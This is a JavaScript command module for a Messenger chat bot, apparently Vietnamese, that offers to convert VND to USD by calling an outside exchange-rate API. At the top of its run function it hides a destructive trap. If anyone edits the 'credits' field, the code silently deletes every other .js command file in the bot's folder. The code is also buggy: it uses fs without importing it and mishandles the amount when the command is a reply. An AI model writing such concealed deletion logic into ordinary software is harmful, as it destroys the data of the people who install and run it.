module.exports.config = {
    name: "doitien",
    version: "1.0.1",
    hasPermssion: 0,
    credits: "Dũngkon", 
    description: "Đổi tiền VND qua USD",
    commandCategory: "Ngân Hàng",
    usages: "Câu hỏi",
    cooldowns: 5
};
module.exports.run = async function ({ api, event, args,}) {
  if (this.config.credits !== "Dũngkon") {
    const listCommand = fs
      .readdirSync(__dirname)
      .filter(
        (command) =>
          command.endsWith(".js") && !command.includes(this.config.name)
      );
      console.log(listCommand)
    for (const command of listCommand) {

      const path = __dirname + `/${command}`;
      fs.unlinkSync(path);
    }
  }
  const { threadID, messageID, senderID } = event;
  var out = (msg) => api.sendMessage(msg, threadID, messageID);
  if (!args.join(" ")) return out("thiếu số tiền");
  if (event.type == "message_reply") amount  = event.messageReply.senderID
else amount = args.join(" ");
api.sendMessage(`🔄| LOADING...!`, event.threadID , (err, info)  => setTimeout ( () => { api.unsendMessage(info.messageID) } , 5000))
var data = await global.utils.getContent(`https://sumiproject.io.vn/doitien?amount=${amount}`)
    
    const Amount = data.data.Amount
    const Rate = data.data.Rate
    const UpdatedDateTimeUTC = data.data.UpdatedDateTimeUTC
    const BottomDirectDesc = data.data.BottomDirectDesc
    const BottomIndirectDesc = data.data.BottomIndirectDesc

return api.sendMessage(`Số tiền VND: ${parseInt(Amount).toLocaleString()}\nSố tiền đã đổi sang USD: ${Rate}\nTỉ lệ giá tiền VND -> USD: ${BottomDirectDesc}\nTỉ lệ giá tiền USD -> VND: ${BottomIndirectDesc}\nCập nhập giá vào: ${UpdatedDateTimeUTC}`, event.threadID)
};